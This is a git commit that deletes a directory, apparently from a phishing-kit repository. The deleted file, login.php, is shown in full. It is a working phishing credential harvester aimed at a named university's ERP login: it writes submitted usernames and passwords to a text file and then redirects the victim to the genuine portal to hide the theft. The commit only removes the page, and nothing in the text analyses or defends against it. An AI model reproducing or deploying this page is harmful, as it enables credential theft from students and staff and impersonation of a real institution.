919bc4fb6c3103b72a13a0fca7afc26f345a6b9f
Dhruv kumar <134788310+dK1925402@users.noreply.github.com>
2023-07-30 06:02:16 +0000

    Delete .sites/dseu directory

--- .sites/dseu/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://erp.dseu.ac.in/');
-exit();
-?>
